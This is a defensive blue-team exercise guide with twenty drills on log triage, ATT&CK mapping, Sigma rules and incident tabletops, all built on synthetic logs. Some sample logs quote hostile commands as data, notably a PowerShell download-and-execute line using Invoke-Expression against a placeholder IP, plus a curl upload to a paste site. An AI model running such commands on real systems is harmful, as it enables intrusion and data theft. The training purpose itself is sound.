# Blue Team Drills: Logs, Triage, Detection, and Incident Response

[Home](../README.md) / [Exercises](README.md) / Blue team drills

Blue team work is the discipline of turning incomplete signals into a defensible decision. These 24 drills use synthetic logs and tabletop scenarios so you can practice triage, detection engineering, ATT&CK mapping, and incident response without touching real personal data or a production network.

**Data rules.** Every log line in this file is synthetic. Hostnames use `LAB-*`, users use `lab.*`, domains use reserved names such as `example.test`, and addresses come from documentation ranges. Do not replace them with real customer data, real mailbox contents, or production logs in a portfolio. If real data appears in an exercise, stop and report it through your organization's channel.

**Environment.** A Linux analysis VM with `jq`, `awk`, `sort`, `grep`, and Python 3 is enough. A SIEM is optional; the reasoning matters more than the product. [SANS SIFT Workstation](https://www.sans.org/tools/sift-workstation/) is a free option for forensic tooling. For detection content, [Sigma](https://github.com/SigmaHQ/sigma) provides a vendor-neutral rule format.

> **Tabletop safety.** The ransomware and business email compromise drills are discussions, not instructions. Do not delete, encrypt, isolate, or otherwise change a real system as part of an exercise. In a real incident, follow your organization's plan and legal guidance.

## Evidence setup

```bash
mkdir -p ~/cyberlab-evidence/blue-team ~/lab-data/blue-team
chmod 700 ~/cyberlab-evidence
```

For every drill, save the input data, the query you ran, the output, your assessment, and a confidence level. A triage note that says "suspicious" without evidence is not reusable.

## BT-01 — Inventory log sources and find the gaps

**Goal.** Build a source inventory that shows what you can answer, what you cannot, and who owns each source.

**Prerequisites.** A lab SIEM or a folder of synthetic logs. No real data.

**Steps.** Run these in order and record the output.

1. List the sources you would expect in a mid-sized organization: endpoint, identity provider, DNS, proxy, firewall, cloud control plane, SaaS audit log, vulnerability scanner, and ticketing.
2. For each source, record the fields needed for triage: timestamp with time zone, host, user, source address, action, result, and a correlation ID.
3. Record retention, ingest latency, owner, and access method.
4. Mark each source as present, partial, or absent in your lab.

**Expected reasoning.** A source can exist but be useless for a question if it lacks user identity or retains data for only 24 hours. "We have DNS logs" is not the same as "we can attribute a query to a host and user." Gaps are findings.

**Prove it.** Save a table with columns: source, key fields, retention, latency, owner, coverage status, and one question it cannot answer.

**Reflect.** Which missing source would most limit a ransomware investigation, and why? How does retention affect the ability to establish a timeline after a long dwell time?

## BT-02 — Build a timeline from mixed sources

**Goal.** Normalize timestamps and order events from three sources into one defensible timeline.

**Prerequisites.** BT-01. A text editor and `sort`.

**Steps.** Run these in order and record the output.

1. Create a synthetic event file with mixed formats and time zones.

   ```text
   2026-10-30T09:58:12Z auth sshd Accepted publickey for lab.user from 198.51.100.44 port 51022
   2026-10-30 04:59:03 -0500 endpoint process cmd.exe parent WINWORD.EXE user LAB\lab.user host LAB-WS01
   2026-10-30T10:00:44+00:00 dns query a1b2c3.telemetry.example.test from 192.0.2.61
   2026-10-30T09:59:30Z proxy POST https://paste.example.test/upload 200 bytes=3145728 user=lab.user
   2026-10-30 05:01:10 -0500 firewall allow 192.0.2.61 -> 203.0.113.66:443
   ```

2. Convert every timestamp to UTC in a copy. Record the conversion, not just the result.
3. Sort the normalized timeline.
4. Mark the first event that is anomalous relative to a stated baseline.

**Expected reasoning.** The endpoint and firewall lines are in UTC-05:00, so `04:59:03 -0500` is `09:59:03Z`. The order is SSH login, endpoint process, proxy upload, DNS query, firewall allow. A timeline is not proof of causation; it shows sequence and opportunity.

**Prove it.** Save the normalized CSV and a five-line narrative with the earliest and latest events, the suspected initial action, and one uncertainty.

**Reflect.** Why is a local timestamp without an offset dangerous? Which clock would you trust least, and how would you test clock skew?

## BT-03 — Detect SSH brute force and a successful login

**Goal.** Distinguish failed guessing from a successful authentication and decide whether to escalate.

**Prerequisites.** BT-02. `grep`, `awk`, `sort`.

**Steps.** Run these in order and record the output.

1. Create the synthetic authentication log.

   ```text
   Oct 30 09:10:01 lab-vm sshd[2201]: Failed password for invalid user admin from 198.51.100.77 port 51001 ssh2
   Oct 30 09:10:03 lab-vm sshd[2201]: Failed password for invalid user admin from 198.51.100.77 port 51002 ssh2
   Oct 30 09:10:05 lab-vm sshd[2201]: Failed password for invalid user oracle from 198.51.100.77 port 51003 ssh2
   Oct 30 09:10:07 lab-vm sshd[2201]: Failed password for invalid user test from 198.51.100.77 port 51004 ssh2
   Oct 30 09:10:09 lab-vm sshd[2201]: Failed password for lab.user from 198.51.100.77 port 51005 ssh2
   Oct 30 09:10:12 lab-vm sshd[2201]: Failed password for lab.user from 198.51.100.77 port 51006 ssh2
   Oct 30 09:10:15 lab-vm sshd[2201]: Failed password for lab.user from 198.51.100.77 port 51007 ssh2
   Oct 30 09:10:18 lab-vm sshd[2201]: Failed password for lab.user from 198.51.100.77 port 51008 ssh2
   Oct 30 09:10:24 lab-vm sshd[2201]: Accepted password for lab.user from 198.51.100.77 port 51009 ssh2
   Oct 30 09:11:02 lab-vm sudo: lab.user : TTY=pts/0 ; PWD=/home/lab.user ; USER=root ; COMMAND=/usr/bin/id
   ```

2. Count failures by source and by account.

   ```bash
   grep 'Failed password' ~/lab-data/blue-team/bt03-auth.log | \
     sed -nE 's/.* for (invalid user )?([^ ]+) from ([0-9.]+).*/\2 \3/p' | \
     sort | uniq -c | sort -nr
   ```

3. Extract the success and the following privilege event.
4. State a hypothesis and one alternative explanation.

**Expected reasoning.** One source produced eight failures in under 20 seconds, covering `admin`, `oracle`, `test`, and `lab.user`, then succeeded for `lab.user` and ran `sudo` within a minute. That is consistent with password guessing followed by valid account use. Alternatives include a user who forgot the password, a misconfigured automation account, or a red team test. The successful login from the same source after failures raises urgency; the sudo event raises impact.

**Prove it.** Save the counts, the success line, the sudo line, and a triage note with severity, confidence, and the next three investigative steps.

**Reflect.** Why is a single success after many failures not automatically a compromise? What would you check first to determine whether the account owner was present?

## BT-04 — Recognize password spraying instead of brute force

**Goal.** Identify a low-and-slow pattern that spreads attempts across accounts to avoid lockout.

**Prerequisites.** BT-03. The same log format.

**Steps.** Run these in order and record the output.

1. Create a synthetic spray log with one attempt per account and a short password list.

   ```text
   Oct 30 11:00:01 lab-vm sshd[3301]: Failed password for lab.alice from 203.0.113.90 port 52001 ssh2
   Oct 30 11:00:04 lab-vm sshd[3301]: Failed password for lab.bob from 203.0.113.90 port 52002 ssh2
   Oct 30 11:00:07 lab-vm sshd[3301]: Failed password for lab.carol from 203.0.113.90 port 52003 ssh2
   Oct 30 11:00:10 lab-vm sshd[3301]: Failed password for lab.dave from 203.0.113.90 port 52004 ssh2
   Oct 30 11:00:13 lab-vm sshd[3301]: Failed password for lab.erin from 203.0.113.90 port 52005 ssh2
   ```

2. Count failures per account and per source. Calculate attempts per account.
3. Compare the shape with BT-03: many attempts per account versus few attempts across many accounts.
4. Identify the ATT&CK sub-technique and one control that would reduce the risk.

**Expected reasoning.** Five accounts, one attempt each, same source, three-second spacing. This is consistent with password spraying (`T1110.003`), not brute force (`T1110.001`). Per-account lockout thresholds may never trigger, so detection must aggregate by source, user-agent, and time window. A successful login later would be the escalation signal.

**Prove it.** Save a small table of account, attempts, and source, plus a one-paragraph distinction between spraying and brute force.

**Reflect.** Why do per-account lockouts fail against spraying? What benign pattern could look similar, and how would you exclude it?

## BT-05 — Triage Windows logon events

**Goal.** Read 4624, 4625, and 4672 events together instead of in isolation.

**Prerequisites.** BT-02. `jq` or a JSON viewer.

**Steps.** Run these in order and record the output.

1. Create synthetic JSON Lines for one workstation.

   ```json
   {"EventID":4625,"TimeCreated":"2026-10-30T09:12:01Z","Computer":"LAB-WS01","TargetUserName":"lab.user","IpAddress":"198.51.100.44","LogonType":3,"Status":"0xc000006d","SubStatus":"0xc000006a"}
   {"EventID":4625,"TimeCreated":"2026-10-30T09:12:09Z","Computer":"LAB-WS01","TargetUserName":"lab.user","IpAddress":"198.51.100.44","LogonType":3,"Status":"0xc000006d","SubStatus":"0xc000006a"}
   {"EventID":4625,"TimeCreated":"2026-10-30T09:12:17Z","Computer":"LAB-WS01","TargetUserName":"lab.admin","IpAddress":"198.51.100.44","LogonType":3,"Status":"0xc000006d","SubStatus":"0xc000006d"}
   {"EventID":4624,"TimeCreated":"2026-10-30T09:13:02Z","Computer":"LAB-WS01","TargetUserName":"lab.user","IpAddress":"198.51.100.44","LogonType":10,"AuthenticationPackageName":"Negotiate"}
   {"EventID":4672,"TimeCreated":"2026-10-30T09:13:05Z","Computer":"LAB-WS01","SubjectUserName":"lab.user","PrivilegeList":"SeDebugPrivilege SeBackupPrivilege"}
   ```

2. Count failures by target user and source.
3. Identify the successful logon type and what it means.
4. Identify why 4672 matters after 4624.

**Expected reasoning.** Event 4625 with `SubStatus 0xc000006a` means bad password; `0xc000006d` is a generic failure often used for unknown user or bad password. Logon type 10 is RemoteInteractive (RDP), not a network logon. Event 4672 means the logon received special privileges, which is high impact when it follows an interactive logon from an unusual source. Two failures then success is weak evidence alone; correlation with endpoint and RDP source is needed.

**Prove it.** Save the query output and a short triage note separating facts, inferences, and unknowns.

**Reflect.** Why is logon type important when assessing lateral movement? Which event would you request next to see what the user did after logon?

## BT-06 — Analyze process creation and parentage

**Goal.** Use parent-child relationships and command lines to identify a suspicious execution chain.

**Prerequisites.** BT-05. `jq`.

**Steps.** Run these in order and record the output.

1. Create synthetic Sysmon-style process events.

   ```json
   {"EventID":1,"UtcTime":"2026-10-30T09:59:03Z","Computer":"LAB-WS01","User":"LAB\\lab.user","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"cmd.exe /c whoami"}
   {"EventID":1,"UtcTime":"2026-10-30T09:59:28Z","Computer":"LAB-WS01","User":"LAB\\lab.user","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAE0AYQByAGsAZQByAA=="}
   {"EventID":1,"UtcTime":"2026-10-30T09:59:40Z","Computer":"LAB-WS01","User":"LAB\\lab.user","Image":"C:\\Users\\lab.user\\AppData\\Local\\Temp\\update.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"C:\\Users\\lab.user\\AppData\\Local\\Temp\\update.exe"}
   ```

2. Extract Image, ParentImage, CommandLine, and user.
3. Rank the three events by suspicion and justify each rank.
4. Map the chain to ATT&CK techniques.

**Expected reasoning.** Word spawning `cmd.exe` is unusual for normal document editing; a hidden PowerShell with an encoded command is more suspicious; PowerShell spawning an executable from `AppData\Local\Temp` is a strong dropper pattern. Plausible benign explanations include a macro-enabled business template or an IT script, but those should be verified with the user and change record. Mapping includes `T1204.002`, `T1059.003`, `T1059.001`, `T1027`, and `T1105`.

**Prove it.** Save the extracted table, a ranked assessment, and an ATT&CK mapping with one evidence line per technique.

**Reflect.** Why is parentage more reliable than an image name? What would you check before declaring the `update.exe` malicious?

## BT-07 — Read PowerShell script-block logging

**Goal.** Extract intent from a script-block event without executing the script.

**Prerequisites.** BT-06. `jq`.

**Steps.** Run these in order and record the output.

1. Create a synthetic 4104 event.

   ```json
   {"EventID":4104,"TimeCreated":"2026-10-30T10:02:11Z","Computer":"LAB-WS02","UserId":"LAB\\lab.user","ScriptBlockText":"$u='http://203.0.113.66/a.ps1'; $c=New-Object Net.WebClient; Invoke-Expression $c.DownloadString($u)","ScriptBlockId":"11111111-2222-3333-4444-555555555555","Path":""}
   ```

2. Identify the download, execution, and obfuscation indicators.
3. Check whether the script is signed, whether the path is empty, and what user and host are involved.
4. Write two benign hypotheses and the evidence that would support each.

**Expected reasoning.** The script downloads content from a documentation-range address and passes it to `Invoke-Expression`, a common download-and-execute pattern (`T1059.001`, `T1105`, `T1027`). An empty `Path` can indicate a command typed interactively or a script block created in memory; it is not proof by itself. Benign explanations include an administrative bootstrap script or a software installer, but those should have a change record and a trusted source.

**Prove it.** Save the decoded/pretty-printed event, the indicator list, two hypotheses, and the discriminating evidence for each.

**Reflect.** Why should you not run the script block to "see what it does"? What does script-block logging capture that process creation does not?

## BT-08 — Analyze DNS for beaconing

**Goal.** Distinguish periodic beacon-like queries from normal application traffic using interval and diversity analysis.

**Prerequisites.** BT-01. `awk`, `sort`, Python 3.

**Steps.** Run these in order and record the output.

1. Create a synthetic DNS CSV with a baseline and a candidate.

   ```csv
   timestamp,src_ip,query_name,query_type,rcode
   2026-10-30T10:00:00Z,192.0.2.61,api.example.test,A,NOERROR
   2026-10-30T10:00:30Z,192.0.2.61,cdn.example.test,A,NOERROR
   2026-10-30T10:01:00Z,192.0.2.61,a1b2c3.telemetry.example.test,A,NOERROR
   2026-10-30T10:02:00Z,192.0.2.61,d4e5f6.telemetry.example.test,A,NOERROR
   2026-10-30T10:03:00Z,192.0.2.61,g7h8i9.telemetry.example.test,A,NOERROR
   2026-10-30T10:04:00Z,192.0.2.61,j1k2l3.telemetry.example.test,A,NOERROR
   2026-10-30T10:05:00Z,192.0.2.61,m4n5o6.telemetry.example.test,A,NOERROR
   ```

2. Count queries per parent domain and unique subdomains.
3. Calculate the intervals between queries for the candidate domain.
4. Compare the pattern with the baseline domains and with a known CDN pattern.

**Expected reasoning.** Five queries at almost exactly 60-second intervals, each with a unique random-looking subdomain under one parent, suggest automated beaconing or DNS tunneling (`T1071.004`). A CDN can also use many subdomains, but its intervals and destination diversity usually differ, and the domain should match an approved vendor. The data supports a hypothesis, not attribution.

**Prove it.** Save a table of parent domain, query count, unique subdomains, mean interval, and standard deviation; add a confidence statement.

**Reflect.** How would jitter change your analysis? What other telemetry would you correlate before blocking the domain?

## BT-09 — Triage a proxy log for upload behavior

**Goal.** Find a large outbound upload and separate it from normal browsing.

**Prerequisites.** BT-01. `awk`.

**Steps.** Run these in order and record the output.

1. Create a synthetic proxy log.

   ```text
   2026-10-30T10:04:00Z 192.0.2.61 GET https://docs.example.test/ 200 4096 "Mozilla/5.0"
   2026-10-30T10:05:00Z 192.0.2.61 GET https://mail.example.test/ 200 8192 "Mozilla/5.0"
   2026-10-30T10:06:00Z 192.0.2.61 POST https://paste.example.test/upload 200 3145728 "curl/8.5.0"
   2026-10-30T10:07:00Z 192.0.2.61 GET https://cdn.example.test/app.js 200 204800 "Mozilla/5.0"
   ```

2. Sort by bytes and identify the outlier.
3. Check the method, user agent, destination category, and time of day.
4. Decide whether the event warrants escalation and what you need next.

**Expected reasoning.** A 3 MB POST to a paste site using `curl` rather than a browser is unusual for a normal user workstation. It could be a developer uploading a log bundle or a script posting build output; without data classification and user context, it is a lead, not a confirmed exfiltration. The destination reputation, whether the host usually runs `curl`, and the content type matter.

**Prove it.** Save the top-five uploads by bytes and a triage note with severity, confidence, and two follow-up questions.

**Reflect.** Why is byte volume alone weak evidence? What would you compare against to establish a baseline for this host?

## BT-10 — Apply a consistent EDR alert triage rubric

**Goal.** Evaluate an endpoint alert with a repeatable rubric instead of intuition.

**Prerequisites.** BT-06. No endpoint agent required.

**Steps.** Run these in order and record the output.

1. Review this synthetic alert.

   ```json
   {"alert_name":"Suspicious PowerShell Execution","severity":"high","host":"LAB-WS03","user":"LAB\\lab.user","process":"powershell.exe","parent":"explorer.exe","command_line":"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\lab.user\\AppData\\Local\\Temp\\inv.ps1","first_seen":"2026-10-30T10:10:00Z","network":"203.0.113.77:443"}
   ```

2. Score each rubric dimension from 0 to 2: identity context, process ancestry, command-line intent, network destination, persistence, data access, and scope.
3. Identify what the alert does not tell you.
4. Decide: close, monitor, or escalate, and state the reason.

**Expected reasoning.** Hidden PowerShell launched by Explorer from a temp path with a network connection is a high-risk combination. The alert does not show the script contents, whether the user ran it, whether the file is signed, or whether other hosts have the same indicator. A reasonable decision is escalate and isolate the host pending verification, following local policy; not "delete the file and close".

**Prove it.** Save the scoring table, the decision, and the three questions you would ask the user or system owner.

**Reflect.** Why is a high-severity alert not automatically an incident? What would make you downgrade this alert?

## BT-11 — Correlate Sysmon process, network, and DNS events

**Goal.** Build a single host story from process creation, network connection, and DNS query events.

**Prerequisites.** BT-06 and BT-08. `jq`.

**Steps.** Run these in order and record the output.

1. Create synthetic events for one host.

   ```json
   {"EventID":1,"UtcTime":"2026-10-30T10:20:00Z","Computer":"LAB-WS04","Image":"C:\\Users\\lab.user\\Downloads\\invoice.exe","ParentImage":"C:\\Program Files\\Microsoft Outlook\\OUTLOOK.EXE","CommandLine":"C:\\Users\\lab.user\\Downloads\\invoice.exe"}
   {"EventID":22,"UtcTime":"2026-10-30T10:20:02Z","Computer":"LAB-WS04","Image":"C:\\Users\\lab.user\\Downloads\\invoice.exe","QueryName":"cdn.telemetry.example.test","QueryStatus":0}
   {"EventID":3,"UtcTime":"2026-10-30T10:20:03Z","Computer":"LAB-WS04","Image":"C:\\Users\\lab.user\\Downloads\\invoice.exe","DestinationIp":"203.0.113.88","DestinationPort":443,"Protocol":"tcp"}
   {"EventID":11,"UtcTime":"2026-10-30T10:20:10Z","Computer":"LAB-WS04","Image":"C:\\Windows\\System32\\notepad.exe","TargetFilename":"C:\\Users\\lab.user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\readme.lnk"}
   ```

2. Order events and identify the initial execution, network behavior, and persistence.
3. Map to ATT&CK and name one detection opportunity per stage.
4. State what is missing from the telemetry.

**Expected reasoning.** Outlook delivering an executable from Downloads is a phishing execution pattern (`T1566.001`, `T1204.002`). DNS and HTTPS follow (`T1071.001`), and a startup-folder shortcut suggests persistence (`T1547.001`). Missing data may include file hash, signature, parent command line, user interaction, and whether the process was blocked. The startup file write is high-signal and should be investigated before reboot.

**Prove it.** Save the ordered timeline, ATT&CK table, and a detection idea for each stage.

**Reflect.** Why is the startup-folder write more actionable than the DNS query alone? Which event would you preserve first if the host had to be isolated?

## BT-12 — Triage cloud control-plane activity

**Goal.** Recognize credential persistence and logging tampering in a cloud audit trail.

**Prerequisites.** BT-01. `jq`.

**Steps.** Run these in order and record the output.

1. Create synthetic CloudTrail-style events.

   ```json
   {"eventTime":"2026-10-30T11:00:00Z","eventSource":"iam.amazonaws.com","eventName":"CreateAccessKey","awsRegion":"us-east-1","sourceIPAddress":"198.51.100.90","userIdentity":{"type":"IAMUser","userName":"lab-ci","accountId":"111122223333"},"requestParameters":{"userName":"lab-admin"}}
   {"eventTime":"2026-10-30T11:01:30Z","eventSource":"cloudtrail.amazonaws.com","eventName":"StopLogging","awsRegion":"us-east-1","sourceIPAddress":"198.51.100.90","userIdentity":{"type":"IAMUser","userName":"lab-ci","accountId":"111122223333"},"requestParameters":{"name":"arn:aws:cloudtrail:us-east-1:111122223333:trail/lab-trail"}}
   {"eventTime":"2026-10-30T11:02:10Z","eventSource":"ec2.amazonaws.com","eventName":"RunInstances","awsRegion":"us-east-1","sourceIPAddress":"198.51.100.90","userIdentity":{"type":"IAMUser","userName":"lab-ci","accountId":"111122223333"},"requestParameters":{"instanceType":"t3.large","imageId":"ami-0123456789abcdef0"}}
   ```

2. Order the events and identify the persistence, defense-evasion, and resource-abuse actions.
3. Check which identity performed each action and whether the source address is consistent with its normal baseline.
4. Map to ATT&CK cloud techniques and list the containment options.

**Expected reasoning.** Creating an access key for another principal is additional cloud credentials (`T1098.001`). Stopping a trail is disabling cloud logs (`T1562.008`), a defense-evasion action that should be high priority. Launching instances may be cryptomining or staging (`T1578.002`). The same user and source address across all three events suggest a single session; that is a correlation lead, not proof of compromise. The account ID is a documentation placeholder.

**Prove it.** Save a table of time, principal, action, resource, source, and technique; add a containment recommendation that follows organizational approval.

**Reflect.** Why is `StopLogging` often more urgent than the resource creation? What identity controls would limit the blast radius of a leaked CI credential?

## BT-13 — Triage Kubernetes audit events

**Goal.** Identify a service account performing unusual pod and secret operations.

**Prerequisites.** BT-12. `jq`.

**Steps.** Run these in order and record the output.

1. Create synthetic Kubernetes audit events.

   ```json
   {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/lab/pods","verb":"create","user":{"username":"system:serviceaccount:lab:builder"},"objectRef":{"resource":"pods","namespace":"lab","name":"web-0"},"responseStatus":{"code":201},"requestReceivedTimestamp":"2026-10-30T12:00:00Z"}
   {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"bbbbbbbb-cccc-dddd-eeee-ffffffffffff","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/lab/pods/web-0/exec?command=sh&stdin=true","verb":"create","user":{"username":"system:serviceaccount:lab:builder"},"objectRef":{"resource":"pods/exec","namespace":"lab","name":"web-0","subresource":"exec"},"responseStatus":{"code":101},"requestReceivedTimestamp":"2026-10-30T12:01:00Z"}
   {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"cccccccc-dddd-eeee-ffff-000000000000","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/lab/secrets/db-creds","verb":"get","user":{"username":"system:serviceaccount:lab:builder"},"objectRef":{"resource":"secrets","namespace":"lab","name":"db-creds"},"responseStatus":{"code":200},"requestReceivedTimestamp":"2026-10-30T12:02:00Z"}
   ```

2. Identify what the service account did, in order.
3. Check whether each action is consistent with a build pipeline's normal role.
4. Map to ATT&CK container techniques and propose RBAC or admission controls.

**Expected reasoning.** A builder service account created a pod, executed a shell inside it, then read a database secret. A build pipeline may legitimately create pods, but interactive exec into a running pod and reading production secrets are high-risk and often unnecessary. This suggests container administration (`T1609`), potential credential access (`T1552.007`), and possibly deploy-container behavior (`T1610`). The audit log shows authorization succeeded; that is not the same as legitimate intent.

**Prove it.** Save the ordered actions, a least-privilege RBAC recommendation, and one admission-control idea.

**Reflect.** Why is `pods/exec` a sensitive verb? How would you distinguish a CI job from a human using a stolen service-account token?

## BT-14 — Map a scenario to MITRE ATT&CK

**Goal.** Practice evidence-based technique mapping without overfitting.

**Prerequisites.** BT-06 through BT-13. Access to [ATT&CK](https://attack.mitre.org/).

**Steps.** Run these in order and record the output.

1. Read this synthetic narrative.

   ```text
   A user opens a spreadsheet attachment from an external sender. A macro spawns
   cmd.exe, which runs a hidden PowerShell command that downloads a file from
   203.0.113.66. The file writes a Run key, connects to the same address over 443,
   and the attacker uses RDP from 198.51.100.44 to a file server two hours later.
   ```

2. Identify at least six techniques or sub-techniques with IDs.
3. For each, cite the specific evidence line and one detection data source.
4. Separate confirmed behavior from inferred intent.

**Expected reasoning.** Likely mappings include `T1566.001` (attachment), `T1204.002` (user opens file), `T1059.003` (cmd), `T1059.001` (PowerShell), `T1105` (download), `T1547.001` (Run key), `T1071.001` (web protocol), and `T1021.001` (RDP). The narrative does not prove credential theft, so do not map `T1003` without evidence. Mapping is a communication tool, not a score.

**Prove it.** Save a table: behavior, technique ID, evidence, data source, confidence. Highlight one mapping you rejected and why.

**Reflect.** Why is over-mapping harmful to a detection program? Which technique in this scenario is most likely to be missed by endpoint-only telemetry?

## BT-15 — Write a Sigma detection rule

**Goal.** Convert a behavior into a vendor-neutral detection with explicit scope and false positives.

**Prerequisites.** BT-14. A text editor. Optional: the Sigma repository and a converter.

**Steps.** Run these in order and record the output.

1. Choose the behavior "certutil used to download a file" and identify the log source.
2. Write a Sigma rule with a title, status, log source, selection, condition, false positives, and level.
3. Replace the rule ID with a newly generated UUID; do not reuse someone else's ID.
4. Test the logic against one matching synthetic event and two benign events.

   ```yaml
   title: Certutil URL Cache Download
   id: 5f2c1a7e-9b3d-4c8e-a1f0-6d7b2c4e8a90
   status: experimental
   description: Detects certutil downloading content from a remote URL.
   logsource:
     product: windows
     category: process_creation
   detection:
     selection_img:
       Image|endswith: '\certutil.exe'
     selection_cli:
       CommandLine|contains:
         - '-urlcache'
     condition: selection_img and selection_cli
   falsepositives:
     - Legitimate certificate retrieval by administrators
     - Software deployment tools that use certutil
   level: medium
   ```

**Expected reasoning.** The rule matches a process image and a command-line substring. It will miss renamed binaries and alternate download methods, and it may fire on legitimate certificate operations. A good rule states those limits.

**Prove it.** Save the rule, the generated UUID, a test matrix with one true positive and two false positives, and a note on how you would tune it.

**Reflect.** Why is `Image|endswith` weaker than a hash or signature? What would you add to detect the same behavior if `certutil` were renamed?

## BT-16 — Tune a noisy detection against a baseline

**Goal.** Reduce false positives without hiding the behavior you care about.

**Prerequisites.** BT-15. Synthetic baseline counts.

**Steps.** Run these in order and record the output.

1. Review a synthetic weekly count for an "encoded PowerShell" rule.

   ```text
   day,alerts,confirmed_incidents,known_admin_script
   Mon,42,0,38
   Tue,39,0,35
   Wed,55,1,49
   Thu,41,0,37
   Fri,44,0,40
   Sat,6,0,5
   Sun,5,0,4
   ```

2. Calculate the false-positive rate and identify the dominant benign cause.
3. Propose a tuning change: allowlist a signed admin script by hash, add a parent-process condition, or adjust severity.
4. Predict the effect on true positives and on a renamed script.

**Expected reasoning.** Roughly 90 percent of alerts are a known admin script, so the rule is dominated by a known-good pattern. Allowlisting by file hash or signer reduces noise but can be bypassed by a renamed or modified script. A parent-process condition may be more durable. The goal is not zero alerts; it is a rule an analyst can trust.

**Prove it.** Save the baseline table, the proposed change, the predicted effect, and a rollback condition.

**Reflect.** Why is "close all alerts from this script" dangerous? What would you monitor to ensure tuning did not create a blind spot?

## BT-17 — Triage a suspicious email

**Goal.** Read authentication results and headers without trusting the display name.

**Prerequisites.** BT-01. A text editor.

**Steps.** Run these in order and record the output.

1. Review synthetic headers for an invoice message.

   ```text
   From: "Accounts Payable" <billing@examp1e.test>
   Reply-To: finance-team@example.test
   Return-Path: <bounce@mailer.example.test>
   Subject: Updated invoice for October
   Authentication-Results: mx.example.test; spf=fail smtp.mailfrom=examp1e.test;
     dkim=none; dmarc=fail header.from=examp1e.test
   Received: from relay.example.test (relay.example.test [198.51.100.60])
     by mx.example.test with ESMTPS id abc123 for <lab.user@example.test>
   ```

2. Identify the lookalike domain, the mismatch between `From` and `Reply-To`, and the authentication failures.
3. Decide whether to quarantine, warn the user, or block the sender.
4. Write two benign explanations and how you would rule them out.

**Expected reasoning.** The lookalike domain above uses a digit `1` for the letter `l`, a classic trick. SPF, DKIM, and DMARC results fail, and `Reply-To` points at a different domain. The message is highly likely to be phishing, but the header block is synthetic and headers can be forged; rely on the receiving platform's authentication results, not the display name. Benign explanations include a compromised legitimate sender or a misconfigured mail gateway.

**Prove it.** Save an indicator table (domain, IP, subject, authentication results), a user-impact assessment, and a recommended response.

**Reflect.** Why is DMARC `p=none` only monitoring? What would you check before blocking the entire sending domain?

## BT-18 — Analyze a possible data exfiltration

**Goal.** Combine volume, destination, timing, and data classification to assess exfiltration risk.

**Prerequisites.** BT-09. Synthetic firewall and proxy summaries.

**Steps.** Run these in order and record the output.

1. Review hourly outbound bytes for one host.

   ```text
   hour,bytes_out,dest_category
   00,1200000,backup
   01,800000,backup
   02,4200000000,cloud-storage
   03,900000,backup
   04,1100000,backup
   ```

2. Compare the 02:00 hour with the host's baseline and with the business's normal backup window.
3. Check whether the destination is approved, whether the host normally uses it, and whether the volume matches a known job.
4. State whether this is confirmed exfiltration, a lead, or a benign backup, and what would decide it.

**Expected reasoning.** A 4.2 GB upload to cloud storage at 02:00 is a strong outlier, but it could be a legitimate backup or a sanctioned sync. The category alone is not reputation. You need the destination domain, user context, data classification, and whether the backup job was scheduled. Confirmation requires content or DLP evidence, not volume alone.

**Prove it.** Save the baseline comparison, a hypothesis table, and the three pieces of evidence that would confirm or refute it.

**Reflect.** Why is "large upload" a weak detection by itself? How can an attacker stay below a volume threshold?

## BT-19 — Tabletop: ransomware on a file server

**Goal.** Practice the first two hours of a ransomware response as a decision exercise.

**Prerequisites.** A small group or a written solo exercise. [NIST SP 800-61r3](https://csrc.nist.gov/pubs/sp/800/61/r3/final) for reference.

**Steps.** Run these in order and record the output.

1. Read the scenario.

   ```text
   At 08:05, users report that files on LAB-FS01 have unusual extensions and
   cannot be opened. At 08:08, the backup console shows the last successful job
   was 26 hours ago. At 08:12, a workstation shows a ransom note. The service
   desk has 40 tickets and the file server supports payroll.
   ```

2. Answer in writing: who declares an incident, who is the incident commander, and what is the first containment action?
3. Decide the order of isolation, evidence preservation, backup validation, and business communication.
4. Identify the legal, privacy, and regulatory notifications that may be required, without assuming a specific jurisdiction.
5. List three decisions that require executive approval.

**Expected reasoning.** Declare and assign an incident commander early; isolate affected hosts in a way that preserves evidence and does not destroy volatile data; do not reconnect backups blindly; validate that backups are immutable and clean; communicate through a controlled channel. Notification obligations depend on jurisdiction, data types, and contracts, so involve legal counsel rather than guessing. Paying a ransom is a policy and legal decision, not an IT decision.

**Prove it.** Save a decision log with time, decision, owner, rationale, and open questions. Include a "do not do" list.

**Reflect.** Why can restoring from an unvalidated backup reinfect the environment? What would you need to prove before declaring recovery complete?

## BT-20 — Tabletop: business email compromise

**Goal.** Respond to an invoice-fraud scenario with identity, mailbox, and payment controls.

**Prerequisites.** BT-17 and BT-19.

**Steps.** Run these in order and record the output.

1. Read the scenario.

   ```text
   Finance reports that a vendor's bank details changed by email. The message
   came from a lookalike domain and replied to an existing thread. A payment of
   48,000 USD is scheduled for 15:00 today. The vendor's real contact is
   unreachable by phone.
   ```

2. Identify the first three actions and who owns each.
3. Decide how to verify the change through an independent channel.
4. List containment steps for the mailbox, the lookalike domain, and payment systems.
5. Define the evidence to preserve and the notification audience.

**Expected reasoning.** Pause the payment first, then verify through a known-good channel, not by replying to the suspicious thread. Contain the affected mailbox only with proper authorization and evidence preservation. Report the lookalike domain to the mail provider and security team. Payment fraud may trigger contractual, legal, and law-enforcement considerations; involve the appropriate owners. Mapping includes `T1566.002`, `T1656`, and possibly mailbox-rule persistence.

**Prove it.** Save an action plan with owners, deadlines, verification steps, and a communication log.

**Reflect.** Why is replying to the thread an unsafe verification method? What mailbox rule would you check first, and why?

